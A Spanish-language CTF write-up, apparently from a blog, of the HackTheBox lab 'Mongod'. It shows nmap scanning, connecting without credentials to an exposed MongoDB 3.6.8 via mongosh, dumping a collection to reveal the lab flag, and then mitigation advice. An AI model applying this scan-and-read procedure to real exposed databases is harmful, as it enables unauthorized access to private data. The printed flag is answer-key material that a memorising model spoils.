---
layout: post
title: HTB — Mongod
date: 2026-05-31
platform: HackTheBox
difficulty: very-easy
description: MongoDB sin autenticación expuesto a red
tags:
  - MongoDB
  - Linux
---

## Introducción

Mongod presenta un escenario que aparece con frecuencia preocupante en auditorías reales: **una base de datos expuesta directamente a la red sin ningún tipo de autenticación**. MongoDB, en versiones antiguas y configuraciones por defecto, arranca sin requerir usuario ni contraseña. Si el puerto queda accesible, cualquiera puede conectarse, listar todas las bases de datos y leer su contenido completo.

No hace falta explotar ninguna vulnerabilidad técnica. Solo conectarse.

---

## Reconocimiento

Verificamos conectividad:

```bash
ping -c 1 10.129.x.x
# -c 1    Envía solo 1 paquete ICMP
```

Descubrimiento de puertos:

```bash
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.129.x.x -oG allports
# -p-          Escanea los 65535 puertos
# -sS          SYN scan (sigiloso, no completa el handshake TCP)
# --open       Muestra solo puertos abiertos
# --min-rate   Envía mínimo 5000 paquetes por segundo
# -vvv         Verbose: muestra resultados en tiempo real
# -n           Sin resolución DNS (más rápido)
# -Pn          Omite el host discovery (asume que el host está activo)
# -oG          Guarda el output en formato Grepable
```

Output relevante:

```
PORT      STATE SERVICE
22/tcp    open  ssh
27017/tcp open  mongod
```

SSH en el 22 — lo dejamos para cuando tengamos credenciales. El protagonista es el **27017**, puerto estándar de MongoDB.

Escaneo de versiones y scripts:

```bash
nmap -sCV -p22,27017 10.129.x.x -oN target
# -sC          Ejecuta scripts de detección por defecto (NSE)
# -sV          Detecta versión del servicio
# -p22,27017   Escanea solo los puertos especificados
# -oN          Guarda el output en formato Normal (legible)
```

Output relevante:

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1
27017/tcp open  mongodb MongoDB 3.6.8
| mongodb-info:
|   MongoDB Build info
|     version: 3.6.8
|   MongoDB server status
|     host: Mongod:27017
|     ok: 1.0
```

El campo `ok: 1.0` confirma que el servidor respondió sin requerir autenticación.

---

## Explotación

Me conecto directamente con `mongosh`:

```bash
mongosh --host 10.129.x.x --port 27017
# --host    IP del servidor MongoDB
# --port    Puerto donde escucha (27017 por defecto)
```

```
Connecting to: mongodb://10.129.x.x:27017/
test>
```

Conectado. Sin usuario, sin contraseña.

---

## Enumeración de la base de datos

```javascript
show dbs
// Lista todas las bases de datos del servidor
```

```
admin
config
local
sensitive_information
```

`sensitive_information` es la candidata. Me muevo a ella:

```javascript
use sensitive_information
// Cambia a la base de datos especificada

show collections
// Lista todas las colecciones de la base de datos activa
```

```
flag
users
```

```javascript
db.flag.find().pretty()
// db.<colección>.find()    Devuelve todos los documentos de la colección
// .pretty()                Formatea el output para mejor legibilidad
```

```json
{
  "_id": ObjectId("..."),
  "flag": "1b6e6fb359e7c40241b6d431427ba6ea"
}
```

---

## ¿Qué aprendemos de esto?

**MongoDB sin auth es una catástrofe silenciosa.** Durante años, versiones antiguas de MongoDB arrancaban por defecto sin requerir contraseña y escuchaban en todas las interfaces de red. En 2017 una campaña masiva de ransomware borró y secuestró más de 27,000 instancias de MongoDB expuestas sin autenticación.

**El puerto 27017 nunca debería ser accesible desde internet.** Las bases de datos deben vivir en redes internas, accesibles solo desde los servidores de aplicación que las necesitan.

**La autenticación debe ser obligatoria desde el inicio.** Siempre verificar que `security.authorization: enabled` esté configurado en `/etc/mongod.conf`.

---

## Comandos básicos de MongoDB para CTF

```javascript
show dbs                               // listar bases de datos
use <nombre>                           // seleccionar base de datos
show collections                       // listar colecciones
db.<colección>.find()                  // ver todos los documentos
db.<colección>.find().pretty()         // ver documentos con formato
db.<colección>.find({clave: "valor"})  // filtrar por campo
db.<colección>.count()                 // contar documentos
```

---

## Resumen técnico

| Elemento | Detalle |
|----------|---------|
| Puerto | 27017/tcp (MongoDB 3.6.8) |
| Vulnerabilidad | MongoDB sin autenticación accesible desde red |
| Acceso obtenido | Lectura completa de todas las bases de datos |
| Herramientas | `nmap`, `mongosh` |
| Mitigación | Habilitar autenticación (`security.authorization: enabled`), restringir acceso por IP con firewall, nunca exponer bases de datos directamente a internet |
